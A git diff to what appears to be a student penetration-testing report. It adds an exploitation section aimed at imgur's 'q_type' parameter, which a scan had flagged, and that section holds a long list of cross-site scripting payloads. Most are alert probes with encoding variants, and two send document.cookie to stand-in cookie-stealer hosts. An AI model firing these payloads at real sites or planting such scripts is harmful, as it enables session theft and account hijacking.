@@ -675,7 +675,50 @@ You searched for: <img src=1 onerror='/* Bad stuff here... */'>
 #### Exploitation
 - Let's focus at the vulnerability which we found using nexpose scan earlier. 
 - [Nexpose XSS vulnerability](imgur_nexpose_report/Document.md#321-cross-site-scripting-vulnerability-http-cgi-0010)
-
+- The scan founded out that the 'q_type' parameter which occures at several urls might be xss vulnerable.
+- We won't try another paramethers at other imgur urls because nexpose which is quite a sofisticated scan did not noticed anything suspicious about them.
+- XSS payload list
+```javascript
+"><script>"
+<script>alert("WXSS")</script>
+<<script>alert("WXSS");//<</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+\";alert('XSS');//
+%3cscript%3ealert("WXSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+<xss><script>alert('WXSS')</script></vulnerable>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG%20SRC="javascript:alert('WXSS');">
+<IMG%20SRC="javascript:alert('WXSS')"
+<IMG%20SRC=javascript:alert('WXSS')>
+<IMG%20SRC=JaVaScRiPt:alert('WXSS')>
+<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+<IMG%20SRC=`javascript:alert("'WXSS'")`>
+<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG%20SRC='javasc  ript:alert(document.cookie)'>
+<IMG%20SRC="jav ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x09;ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x0A;ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x0D;ascript:alert('WXSS');">
+<IMG%20SRC="%20&#14;%20javascript:alert('WXSS');">
+<IMG%20DYNSRC="javascript:alert('WXSS')">
+<IMG%20LOWSRC="javascript:alert('WXSS')">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+'';!--"<XSS>=&{()}
+```
 
 ### References
 - [1] Command Injection - OWASP. Command Injection - OWASP [online]. Texas, USA: OWASP Foundation, 2018 [quoted. 2019-04-13]. Availiable from: https://www.owasp.org/index.php/Command_Injection
@@ -683,3 +726,4 @@ You searched for: <img src=1 onerror='/* Bad stuff here... */'>
 - [3] Acunetix. Acunetix [online]. Acunetix: Acunetix, 2018 [quoted. 2019-05-12]. Availiable from: https://www.acunetix.com/websitesecurity/sql-injection/
 - [4] Null-byte.wonderhowto.com. Null-byte.wonderhowto.com [online]. null-byte.wonderhowto.com: null-byte.wonderhowto.com, 2018 [quoted. 2019-05-12]. Availiable from: https://null-byte.wonderhowto.com/how-to/attack-web-applications-with-burp-suite-sql-injection-0184090/
 - [5] https://portswigger.net/web-security/cross-site-scripting
+- https://github.com/ismailtasdelen/xss-payload-list
